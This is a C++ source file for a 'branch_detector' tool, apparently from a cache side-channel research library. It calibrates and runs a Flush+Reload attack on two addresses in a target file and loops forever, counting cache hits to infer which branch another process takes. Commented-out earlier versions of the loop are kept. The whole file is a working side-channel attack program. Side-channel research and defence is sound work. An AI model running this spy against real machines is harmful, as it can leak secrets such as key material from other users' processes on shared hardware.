#include "../lib/attack/attack.hpp"
#include "../lib/sampling/sampler_primitives.hpp"
#include "../lib/sampling/samplers.hpp"
#include "../lib/utils/memory_wrapper.hpp"
#include "../main/utils/cacheutils.h"
#include "../main/utils/intel.h"
#include <iostream>

const size_t SAMPLE_MEASURE_DELAY = 0;
const size_t BETWEEN_ITEMS_DELAY = 0;
const double MIN_SCORE = 1.0;


Attack getAttack(char* path, size_t first_index, size_t second_index)
{
    MemoryWrapper wrapper(path);
    std::vector<size_t> indexes = { first_index, second_index };
    std::unique_ptr<FlushSamplerPrimitive> primitive = std::make_unique<FlushSamplerPrimitive>();
    std::unique_ptr<Sampler> sampler =
    std::make_unique<ListSampler>(indexes, SAMPLE_MEASURE_DELAY, BETWEEN_ITEMS_DELAY, std::move(primitive));
    std::unique_ptr<AverageSampler> averageSampler =
    std::make_unique<AverageSampler>(std::move(sampler), 100, 0);
    Attack attack(wrapper, AttackType::FlushReload, std::move(averageSampler));

    attack.calibrate();
    return attack;
}

#define LIMIT 220


int main(int argc, char* argv[])
{
    if (argc < 4)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }

    char* path = argv[1];
    int addr0 = std::strtol(argv[2], nullptr, 16);
    int addr1 = std::strtol(argv[3], nullptr, 16);

    if (addr0 <= 0 || addr1 <= 0)
    {
        std::cout << "Usage: branch_detector file addr0 addr1" << std::endl;
        return 1;
    }


    //    std::vector<size_t> indexes = {(size_t)addr0, (size_t)addr1};
    //    MemoryWrapper wrapper(path);
    //    FlushSamplerPrimitive samplerPrimitive;
    //    std::unique_ptr<Sampler> listSampler = std::make_unique<ListSampler>(indexes, 0, 0, std::make_unique<FlushSamplerPrimitive>(samplerPrimitive));
    //    std::unique_ptr<AverageSampler> sampler = std::make_unique<AverageSampler>(std::move(listSampler), 100, 0);
    //    uint total0 = 0;
    //    uint total1 = 0;
    //    std::vector<Measurement> measurements(sampler->GetRequiredSize());
    //    while (true)
    //    {
    //        sampler->Sample(wrapper, measurements);
    //        for (const Measurement& result : measurements)
    //        {
    //            if (result.index == addr0 && result.time <= LIMIT)
    //            {
    //                std::cout << "Case 0 triggered with score: " << result.time
    //                          << " Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
    //                total0++;
    //            }
    //            else if (result.index == addr1 && result.time <= LIMIT)
    //            {
    //                std::cout << "Case 1 triggered with score: " << result.time
    //                          << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
    //                total1++;
    //            }
    //        }
    //    }

    // works
    // uint total0 = 0;
    // uint total1 = 0;
    // while (true)
    // {
    //     samplerPrimitive.Prepare(wrapper, addr1);
    //     int result1 = samplerPrimitive.Sample(wrapper, addr1).time;
    //     samplerPrimitive.Prepare(wrapper, addr0);
    //     int result0 = samplerPrimitive.Sample(wrapper, addr0).time;

    //     if (result0 <= LIMIT)
    //     {
    //         total0++;
    //         std::cout << "Case 0 triggered with " << result0 << " cycles. Total: 0s: " << total0
    //                   << " 1s: " << total1 << std::endl;
    //     }
    //     if (result1 <= LIMIT)
    //     {
    //         total1++;
    //         std::cout << "Case 1 triggered with " << result1 << " cycles. Total: 0s: " << total0
    //                   << " 1s: " << total1 << std::endl;
    //     }
    // }


    Attack attack = getAttack(path, addr0, addr1);

    uint total0 = 0;
    uint total1 = 0;
    while (true)
    {
        attack.attack();
        for (const AttackResult& result : attack.attackResults)
        {
            if (result.index == addr0 && result.score >= MIN_SCORE)
            {
                std::cout << "Case 0 triggered with score: " << result.score
                          << " Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
                total0++;
            }
            else if (result.index == addr1 && result.score >= MIN_SCORE)
            {
                std::cout << "Case 1 triggered with score: " << result.score
                          << " cycles. Total: 0s: " << total0 << " 1s: " << total1 << std::endl;
                total1++;
            }
        }
    }
    return 0;
}
